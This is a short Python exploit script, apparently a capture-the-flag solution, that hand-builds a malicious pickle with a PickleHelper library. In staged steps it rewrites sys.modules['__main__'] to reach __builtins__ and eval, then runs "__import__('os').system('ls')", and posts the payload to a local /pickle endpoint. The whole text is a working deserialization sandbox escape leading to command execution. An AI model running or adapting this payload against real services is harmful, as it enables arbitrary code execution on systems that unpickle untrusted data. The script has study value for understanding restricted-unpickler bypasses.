
from PickleHelper import PickleHelper
import requests

p = PickleHelper()
p.load_class("__main__",'sys')
p.put_memo(0) # # memo[0] = sys

p.push_mark()
p.push_str("'modules'")
p.push_mark()
p.push_str("'__main__'")
p.load_class("__main__",'run')
p.build_dict()
p.build_dict()
p.process_build() # move __main__.run -> __main__

p.load_class("__main__",'__globals__') 
p.put_memo(2) # memo[2] = run.__globals__

# Stage2
p.get_memo(0)
p.push_mark()
p.push_str("'modules'")
p.push_mark()
p.push_str("'__main__'")
p.get_memo(2)
p.build_dict()
p.build_dict()      
p.process_build()
# Stage3
p.push_mark()
p.push_str("'__builtins__'")
p.load_inst("__main__",'__getitem__')
p.put_memo(3)
# Stage4

p.get_memo(0)
p.push_mark()
p.push_str("'modules'")
p.push_mark()
p.push_str("'__main__'")
p.get_memo(3)
p.build_dict()
p.build_dict()
p.process_build()

# Stage5 

p.push_mark()
p.push_str("'eval'")
p.load_inst("__main__",'__getitem__')
p.put_memo(4)

# Stage6
p.get_memo(0)
p.push_mark()
p.push_str("'modules'")

p.push_mark()
p.push_str("'__main__'")
p.get_memo(4)
p.build_dict()

p.build_dict()
p.process_build()
# Stage7
p.push_mark()
p.push_str(""""__import__('os').system('ls')\"""")
p.load_inst("__main__",'__call__')

c = p.compile()
# res
print(requests.get("http://127.0.0.1/pickle",params={"pickle": c}).text)

# print(p.compile())
# print(sys.modules)